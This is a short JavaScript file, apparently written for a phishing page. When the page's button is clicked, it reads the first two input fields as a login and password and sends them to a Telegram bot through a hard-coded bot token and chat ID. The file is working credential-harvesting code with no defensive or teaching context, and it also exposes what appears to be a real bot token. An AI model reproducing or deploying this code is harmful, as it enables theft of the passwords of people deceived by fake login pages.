let BOT_TOKEN = '8447041227:AAEYdjhRMehgWEKYzOX7h-cg9TZdlaMcgHo';
let CHAT_ID = '6774013903';

let  input = document.querySelectorAll('input');
let button = document.querySelector('button');                

const send = async (message) => {
    try {
        let request = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
    } catch (error) {
        console.error("Xato yuz berdi:", error);
    }
};

button.addEventListener('click', (e) => {
    e.preventDefault();

    let xabar = `
        login: ${input[0].value}
        password: ${input[1].value}
    `;

    send(xabar);
});